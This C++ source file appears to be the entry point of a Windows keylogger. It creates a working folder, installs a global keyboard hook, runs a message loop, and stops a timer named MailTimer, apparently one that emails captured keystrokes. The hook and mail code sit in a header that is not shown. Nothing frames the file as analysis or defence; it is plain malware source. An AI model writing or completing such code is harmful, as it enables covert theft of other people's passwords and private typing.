#include <iostream>
#include <windows.h>
#include "KeyboardHook.hpp"


int main() {

    MSG msg;
    IO::MkDir(IO::GetOurPath(true));
    KeyboardHook::InstallHook();
    while (GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    KeyboardHook::MailTimer.Stop();
    return 0;
}